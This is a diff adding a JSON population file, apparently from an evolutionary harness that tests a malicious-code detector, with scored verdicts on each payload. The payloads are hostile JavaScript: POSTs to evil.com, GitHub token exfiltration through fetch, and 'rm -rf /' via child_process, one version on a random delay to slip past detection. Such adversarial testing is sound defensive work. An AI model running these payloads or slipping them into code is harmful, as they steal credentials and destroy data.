@@ -1,0 +1,57 @@
+{
+  "generation": 4,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);",
+      "fitness": 89.85,
+      "isNovel": true,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);",
+      "fitness": 69.85,
+      "isNovel": false,
+      "impact": 0,
+      "verdict": "PASS",
+      "confidence": 0.01,
+      "graph": []
+    },
+    {
+      "payload": "const x = process.env.GITHUB_TOKEN; fetch('http://evil.com?k=' + x);",
+      "fitness": 20.15,
+      "isNovel": true,
+      "impact": 100,
+      "verdict": "BLOCK",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "require('child_process').exec('rm -rf /');",
+      "fitness": 20.15,
+      "isNovel": true,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → EXECUTION"
+      ]
+    },
+    {
+      "payload": "setTimeout(() => { require('child_process').exec('rm -rf /'); }, Math.random() * 5000);",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → EXECUTION"
+      ]
+    }
+  ]
+}
